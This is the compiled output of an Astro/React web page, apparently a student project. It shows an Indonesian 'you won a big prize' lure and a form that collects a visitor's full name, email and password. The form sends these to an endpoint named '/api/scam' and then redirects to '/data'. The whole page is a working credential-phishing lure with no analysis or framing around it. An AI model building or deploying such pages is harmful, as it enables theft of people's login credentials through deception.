import { c as createComponent, r as renderTemplate, a as addAttribute, d as renderComponent, e as renderHead, b as createAstro } from '../chunks/astro/server_bgHAYVtm.mjs';
import 'kleur/colors';
import { s as styles } from '../chunks/index.95d291e9_DlrzX9Bk.mjs';
import { jsxs, jsx } from 'react/jsx-runtime';
import { useState } from 'react';
import { $ as $$ViewTransitions } from '../chunks/ViewTransitions_BsTKKyO_.mjs';
export { renderers } from '../renderers.mjs';

const Buttin = () => {
  const [response, setResponse] = useState("");
  async function submit(e) {
    e.preventDefault();
    const formData = new FormData(e.target);
    const res = await fetch("/api/scam", {
      method: "POST",
      body: formData
    });
    const data = await res.json();
    setResponse(data.message);
    console.log(response);
    window.location.href = "/data";
  }
  return /* @__PURE__ */ jsxs("form", { onSubmit: submit, children: [
    /* @__PURE__ */ jsxs("label", { children: [
      "Nama Lengkap",
      /* @__PURE__ */ jsx("input", { type: "text", name: "nama", id: "nama", autoComplete: "additional-name", required: true })
    ] }),
    /* @__PURE__ */ jsxs("label", { children: [
      "Email",
      /* @__PURE__ */ jsx("input", { type: "email", name: "email", id: "email", autoComplete: "email", required: true })
    ] }),
    /* @__PURE__ */ jsxs("label", { children: [
      "Password",
      /* @__PURE__ */ jsx("input", { type: "password", name: "password", id: "password", autoComplete: "current-password", required: true })
    ] }),
    /* @__PURE__ */ jsx("button", { type: "submit", children: "Klaim Sekarang" })
  ] });
};

const $$Astro = createAstro();
const $$Index = createComponent(($$result, $$props, $$slots) => {
  const Astro2 = $$result.createAstro($$Astro, $$props, $$slots);
  Astro2.self = $$Index;
  return renderTemplate`<html lang="en" data-astro-cid-j7pv25f6> <head><meta charset="utf-8"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="viewport" content="width=device-width"><meta name="generator"${addAttribute(Astro2.generator, "content")}><title>Selamat! Anda Menang Hadiah</title>${renderComponent($$result, "ViewTransitions", $$ViewTransitions, { "data-astro-cid-j7pv25f6": true })}${renderHead()}</head> <body${addAttribute(styles.scamBody, "class")} data-astro-cid-j7pv25f6> <h1 data-astro-cid-j7pv25f6>Selamat! Anda memenangkan hadiah besar!</h1> <h2 data-astro-cid-j7pv25f6>
Silakan isi formulir berikut untuk mengklaim hadiah Anda segera.
</h2> ${renderComponent($$result, "Buttin", Buttin, { "client:idle": true, "client:component-hydration": "idle", "client:component-path": "/home/arona/tugas/vlog_web_property/src/components/nothing.tsx", "client:component-export": "default", "data-astro-cid-j7pv25f6": true })} </body></html>`;
}, "/home/arona/tugas/vlog_web_property/src/pages/index.astro", void 0);

const $$file = "/home/arona/tugas/vlog_web_property/src/pages/index.astro";
const $$url = "";

const _page = /*#__PURE__*/Object.freeze(/*#__PURE__*/Object.defineProperty({
  __proto__: null,
  default: $$Index,
  file: $$file,
  url: $$url
}, Symbol.toStringTag, { value: 'Module' }));

const page = () => _page;

export { page };
